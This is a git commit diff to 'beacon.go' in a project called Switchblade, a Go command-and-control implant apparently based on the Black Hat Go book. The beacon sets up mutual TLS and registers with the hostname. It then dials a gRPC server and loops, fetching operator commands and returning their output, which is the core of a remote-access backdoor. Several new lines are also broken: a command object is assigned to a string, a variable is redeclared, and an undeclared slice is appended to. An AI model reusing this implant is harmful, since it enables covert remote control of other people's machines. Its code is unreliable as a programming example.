614af01c2c9cdfe8afc98d0c8b4ae0ed7c88c9df
matt-culbert <culbertmatt@gmail.com>
2021-12-19 18:44:59 -0500

    Update beacon.go

--- Switchblade/beacon.go
+++ Switchblade/beacon.go
@@ -13,9 +13,49 @@ import (
 	"strings"
 	"time"
 
+	"github.com/blackhat-go/bhg/ch-14/grpcapi"
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/credentials"
 )
+
+// Register holds the beacon name
+type Register struct {
+	Name    string
+}
+
+// GetRequestMetadata gets the current request metadata
+func (s *Register) GetRequestMetadata(context.Context, ...string) (map[string]string, error) {
+	return map[string]string{
+		"name":    s.Name,
+	}, nil
+}
+
+func loadTLSCredentials() (credentials.TransportCredentials, error) {
+	// Load certificate of the CA who signed server's certificate
+	pemServerCA, err := ioutil.ReadFile("/etc/server/certs/ca.crt")
+	if err != nil {
+		return nil, err
+	}
+
+	certPool := x509.NewCertPool()
+	if !certPool.AppendCertsFromPEM(pemServerCA) {
+		return nil, fmt.Errorf("failed to add server CA's certificate")
+	}
+
+	// Load client's certificate and private key
+	clientCert, err := tls.LoadX509KeyPair("/etc/server/certs/server.crt", "/etc/server/certs/server.key")
+	if err != nil {
+		return nil, err
+	}
+
+	// Create the credentials and return it
+	config := &tls.Config{
+		Certificates: []tls.Certificate{clientCert},
+		RootCAs:      certPool,
+	}
+
+	return credentials.NewTLS(config), nil
+}
 
 func main() {
 	var (
@@ -25,36 +65,26 @@ func main() {
 		client grpcapi.ImplantClient
 	)
 
-		//---------- TLS Setting -----------//
-	certificate, err := tls.LoadX509KeyPair(
-		"/etc/server/certs/server-cert.pem",
-		"/etc/server/certs/server-key.pem",
-	)
+	name = exec.Command("hostname") // generate a client name on first launch
+	name := name
+	whoami := Register{Name: name}
 
-	certPool := x509.NewCertPool()
-	bs, err := ioutil.ReadFile("/etc/server/certs/ca-cert.pem")
+	tlsCredentials, err := loadTLSCredentials()
 	if err != nil {
-		log.Fatalf("failed to read ca cert: %s", err)
+		log.Fatal("cannot load TLS credentials: ", err)
 	}
 
-	ok := certPool.AppendCertsFromPEM(bs)
-	if !ok {
-		log.Fatal("failed to append certs")
-	}
-
-	transportCreds := credentials.NewTLS(&tls.Config{
-		ServerName:   "test.temp",
-		Certificates: []tls.Certificate{certificate},
-		RootCAs:      certPool,
-	})
-	
-	if conn, err = grpc.Dial(fmt.Sprintf("test.temp:%d", 443), grpc.WithTransportCredentials(transportCreds)); err != nil {
+	opts = append(opts, grpc.WithTransportCredentials(tlsCredentials))
+	if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 8010),
+		grpc.WithPerRPCCredentials(&whoami),
+		grpc.WithTransportCredentials(tlsCredentials)); err != nil {
 		log.Fatal(err)
 	}
 	defer conn.Close()
 	client = grpcapi.NewImplantClient(conn)
 
 	ctx := context.Background()
+
 	for {
 		var req = new(grpcapi.Empty)
 		cmd, err := client.FetchCommand(ctx, req)
@@ -82,4 +112,3 @@ func main() {
 		client.SendOutput(ctx, cmd)
 	}
 }
-
